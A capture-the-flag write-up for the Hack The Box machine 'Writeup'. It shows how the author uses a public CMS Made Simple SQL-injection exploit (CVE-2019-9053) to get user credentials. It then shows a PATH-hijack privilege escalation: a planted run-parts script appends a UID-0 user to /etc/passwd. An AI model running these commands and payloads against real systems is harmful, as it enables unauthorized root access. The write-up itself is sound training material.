# HTB-Writeup
<img src="https://www.hackthebox.eu/badge/image/172381" alt="Hack The Box">

Box: Writeup  
IP: 10.10.10.138

Browsing to ```http://10.10.10.138/``` we see a warning about an 'Eeyore DoS protection script' so we probably shouldn't do any dirbusting.

The ```/robots.txt``` file has a disallow in place for ```/writeup/``` so of course we'll want to check that out. 

The source code for ```http://10.10.10.138/writeup/``` shows the website is using CMS Made Simple. Running ```searchsploit CMS Made Simple``` shows a lot of results so we need to find out what version we're up against if we want to skid through. The copyright from the source code says 2019 so doing some searching indicates that 2.2.9 or 2.2.10 are the only versions released in that year. This seems like a safe starting point.

With a bit of research, and help from searchsploit, we see that CVE-2019-9053 is a SQL Inject vuln for 2.2.10 with an exploit already available in python. We'll try this one out, but always a good idea to read the source code first though to see what we're doing.

First we can tell that it's written in Python2, but we also want to know what the actual attack is. Looking at ```payload=``` we can see it's a blind time-based SQL injection attack. A good indicator of this is the included ```sleep()``` function. There is also a function to crack the hash once obtained, so we'll give that a shot before trying hashcat. The cracking functionality seems pretty straightforward, running through a provided list using a salt+pw format. I'm going to use the rockyou list for this since everyone should already have a copy.

Let's try the exploit: ```python 46635.py -u http://10.10.10.138/writeup/ --crack -w rockyou.txt```


Password found and cracked!

```
[+] Salt for password found: *****
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: *****
[+] Password cracked: *****
```
*I removed the password, salt, and hash so I don't spoil all of the fun*


Now let's use this to SSH into the box ```ssh jkr@10.10.10.138```

Success, user account owned, so let's grab our first flag ```cat user.txt```

Always a good idea to get some basic ```id``` info to start, so we'll do that and save the information for later.

```uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)```

One thing to note though is the staff membership. In Debian this allows local modification to the system, so may be useful!

Ok so owning user was easy but now we need to get root. There is a great tool called ```pspy``` that we'll use for deeper analysis. It sets up inotify FileSystemWatchers to scan ```/proc/``` and also watch ```/usr``` for short-lived processes. This is a really great enumaration tool to have in your arsenal for path injection and privilege escalation vulns.

We'll copy pspy over to the server so we can use it ```scp pspy32 jkr@10.10.10.138:/home/jkr```  

Once it's on the server we'll need to make it executable ```chmod +x pspy32```

Then we'll launch it to monitor what's going on ```./pspy32```

Start a new SSH session so we can monitor that action first. It's always a good idea to make sure both terminals are viewable so you can see new processes as they happen.

After playing around a bit we can see that after every successful SSH auth the following is run:

```sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new```

Let's go down the rabbit hole and see if we can abuse it. First of all we can see that something called ```run-parts``` gets executed every time. We can also see that it's being executed by relative path so we can probably hijack this.

If we dig deeper with ```which run-parts``` we see that by default it's in ```/bin/```, but if you look closely at the way env sets the path at login you'll see something interesting. When the path is set, ```/usr/local/bin``` is called before ```/usr/bin``` 

We saw earlier that our account was a member of staff, which we can see gives us the write access we need ```find / -group staff 2>/dev/null```

This means that we should be able to put our code in ```/usr/local/bin``` and have it execute next time we SSH into the box.

Time for some path injection.

Let's create a bash script that adds a new root user, then have that execute.

First we will use openssl to create a hash of our desired password ```openssl passwd writeup```

Now create the bash file, add our payload, and make it executable.

```cd /usr/local/bin/```

Create the hijack file: ```nano run-parts```

Add our payload text:
```
#!/bin/bash
echo 'rooot:qzhFLYLV9Mkkg:0:0:root:/root:/bin/bash' >> /etc/passwd
```

And make it executable: ```chmod +x run-parts``` 

Now start a new SSH session to trigger our script, and check the results with ```cat /etc/passwd```

You should see our new ```rooot``` user added with the correct UID and hash, so let's grab the flag.

```
su rooot
cd /root/
cat root.txt
```


"The only way of discovering the limits of the possible is to venture a little way past them into the impossible" - Arthur C. Clarke
